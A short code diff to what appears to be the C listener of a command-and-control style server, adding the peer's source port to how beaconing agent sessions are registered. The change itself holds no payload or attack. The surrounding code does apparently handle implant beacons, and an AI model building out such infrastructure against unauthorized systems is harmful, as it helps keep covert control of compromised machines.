@@ -70,7 +70,7 @@ static void HttpSend404(NetSock Conn)
 }
 
 static void HttpDispatch(NetSock Conn, SessionPool *P, const Config *C,
-                         const char *PeerAddr)
+                         const char *PeerAddr, int SrcPort)
 {
     char Raw[BufSize] = {0};
     int N = recv(Conn, Raw, BufSize - 1, 0);
@@ -93,7 +93,7 @@ static void HttpDispatch(NetSock Conn, SessionPool *P, const Config *C,
     }
 
     int PrevCount   = P->Count;
-    AgentSession *S = PoolRegister(P, PeerAddr);
+    AgentSession *S = PoolRegister(P, PeerAddr, SrcPort);
     if (!S) { HttpSend404(Conn); return; }
     int IsNew = (P->Count > PrevCount);
     if (IsNew) PoolNotifyConnect(P, S);
@@ -129,6 +129,7 @@ void HttpHandleBeacon(NetSock Listener, SessionPool *P, const Config *C)
     if (Conn == NetInvalid) return;
     char PeerAddr[AddrSize];
     strncpy(PeerAddr, inet_ntoa(Peer.sin_addr), AddrSize - 1);
-    HttpDispatch(Conn, P, C, PeerAddr);
+    int SrcPort = (int)ntohs(Peer.sin_port);
+    HttpDispatch(Conn, P, C, PeerAddr, SrcPort);
     NetClose(Conn);
 }
